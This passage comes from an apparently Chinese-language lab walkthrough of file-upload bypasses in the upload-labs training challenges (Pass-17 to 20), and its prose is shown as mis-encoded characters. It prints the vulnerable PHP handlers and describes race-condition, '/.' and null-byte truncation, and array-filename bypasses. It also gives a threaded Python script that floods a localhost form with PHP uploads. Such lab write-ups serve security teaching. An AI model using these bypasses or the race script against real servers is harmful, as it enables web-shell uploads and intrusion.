$file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶å…ˆç»è¿‡ä¿å­˜ï¼Œç„¶ååˆ¤æ–­åç¼€åæ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œå¦‚æœä¸åœ¨åˆ™åˆ é™¤ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰åœ¨ä¿å­˜æ–‡ä»¶ååˆ é™¤æ–‡ä»¶å‰æ¥æ‰§è¡Œphpæ–‡ä»¶</p><h3 id="2-åˆ©ç”¨-14"><a href="#2-åˆ©ç”¨-14" class="headerlink" title="2.åˆ©ç”¨"></a>2.åˆ©ç”¨</h3><p>åˆ©ç”¨æ¡ä»¶ç«äº‰åˆ é™¤æ–‡ä»¶æ—¶é—´å·®ç»•è¿‡ã€‚ä½¿ç”¨å‘½ä»¤<code>pip install hackhttp</code>å®‰è£…<a href="https://github.com/BugScanTeam/hackhttp">hackhttp</a>æ¨¡å—ï¼Œè¿è¡Œä¸‹é¢çš„Pythonä»£ç å³å¯ã€‚å¦‚æœè¿˜æ˜¯åˆ é™¤å¤ªå¿«ï¼Œå¯ä»¥é€‚å½“è°ƒæ•´çº¿ç¨‹å¹¶å‘æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">import hackhttp</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy import Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line">def upload(lists):</span><br><span class="line">    hh = hackhttp.hackhttp()</span><br><span class="line">    raw = <span class="string">&quot;&quot;</span><span class="string">&quot;POST /Pass-17/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Referer: http://127.0.0.1/Pass-17/index.php</span></span><br><span class="line"><span class="string">Cookie: pass=17</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Length: 341</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>upload_file<span class="string">&quot;; filename=&quot;</span><span class="number">17.</span>php<span class="string">&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="string">-----------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>submit<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä¸Šä¼ </span></span><br><span class="line"><span class="string">-----------------------------6696274297634--</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    code, head, html, redirect, log = hh.http(<span class="string">&#x27;http://127.0.0.1/Pass-17/index.php&#x27;</span>, raw=raw)</span><br><span class="line">    <span class="keyword">print</span>(str(code) + <span class="string">&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">200</span>)</span><br><span class="line">pool.map(upload, range(<span class="number">100000</span>))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103205230451.png" alt="image-20201103205230451"></p><h2 id="Pass-18-æ¡ä»¶ç«äº‰"><a href="#Pass-18-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-18 æ¡ä»¶ç«äº‰"></a>Pass-18 æ¡ä»¶ç«äº‰</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> $dir </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103205839989.png" alt="image-20201103205839989"></p><p><code>move</code>æ–‡ä»¶åœ¨<code>rename</code>å‰é¢ï¼Œåˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œä¸Šä¼ å›¾ç‰‡é©¬</p><h3 id="2-åˆ©ç”¨-15"><a href="#2-åˆ©ç”¨-15" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103211045508.png" alt="image-20201103211045508"></p><p>æ— é™é‡æ”¾ï¼Œæˆ‘è¿™æ²¡è·‘å‡ºæ¥ğŸ˜‚</p><h2 id="Pass-19-or-0x00ç»•è¿‡"><a href="#Pass-19-or-0x00ç»•è¿‡" class="headerlink" title="Pass-19 /. or 0x00ç»•è¿‡"></a>Pass-19 /. or 0x00ç»•è¿‡</h2><h3 id="1-åˆ†æ-12"><a href="#1-åˆ†æ-12" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103211406134.png" alt="image-20201103211406134"></p><p>é€šè¿‡ä»£ç ï¼Œå‘ç°<code>move_uploaded_file()</code>å‡½æ•°ä¸­çš„<code>img_path</code>æ˜¯ç”±postå‚æ•°<code>save_name</code>æ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥åœ¨save_nameåˆ©ç”¨00æˆªæ–­ç»•è¿‡ã€‚</p><p>å½“ç„¶ï¼Œå› ä¸º<code>move_uploaded_file</code>ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„<code>/.</code>, æ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨<code>/.</code>ç»•è¿‡</p><h3 id="2-åˆ©ç”¨-16"><a href="#2-åˆ©ç”¨-16" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><code>/.</code>ç»•è¿‡</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103211835095.png" alt="image-20201103211835095"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103211918067.png" alt="image-20201103211918067"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103211938414.png" alt="image-20201103211938414"></p><h2 id="Pass-20-æ•°ç»„-ç»•è¿‡"><a href="#Pass-20-æ•°ç»„-ç»•è¿‡" class="headerlink" title="Pass-20 æ•°ç»„+/.ç»•è¿‡"></a>Pass-20 æ•°ç»„+/.ç»•è¿‡</h2><h3 id="1-ä»£ç åˆ†æ-2"><a href="#1-ä»£ç åˆ†æ-2" class="headerlink" title="1. ä»£ç åˆ†æ"></a>1. ä»£ç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//æ£€æŸ¥MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//æ£€æŸ¥æ–‡ä»¶å</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬5è¡Œå…ˆæ£€æŸ¥MIMEç±»å‹ï¼Œç„¶ååˆ¤æ–­save_nameå‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºå°±æŠŠæ–‡ä»¶æœ¬æ¥åç§°èµ‹å€¼ç»™<code>$file</code>,å¦åˆ™å°±æ˜¯å°†<code>save_name</code>å‚æ•°çš„å€¼èµ‹ç»™å®ƒã€‚ç´§æ¥ç€åˆ¤æ–­<code>$file</code>æ˜¯å¦æ˜¯æ•°ç»„ï¼Œå¦‚æœä¸æ˜¯æ•°ç»„åˆ™å°†å…¶æ‹†æˆæ•°ç»„ï¼Œè¿™é‡Œ<code>explode</code> æ ¹æ®<code>.</code>åˆ†å‰²ï¼Œè¿”å›å€¼ä¸ºæ•°ç»„</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103222435710.png" alt="image-20201103222435710"></p><blockquote><p>explode() å‡½æ•°æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„</p><p>è¯­æ³•ï¼šexplode(separator,string,limit)</p></blockquote><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>separator</em></td><td align="left">å¿…éœ€ã€‚è§„å®šåœ¨å“ªé‡Œåˆ†å‰²å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è¦åˆ†å‰²çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>limit</em></td><td 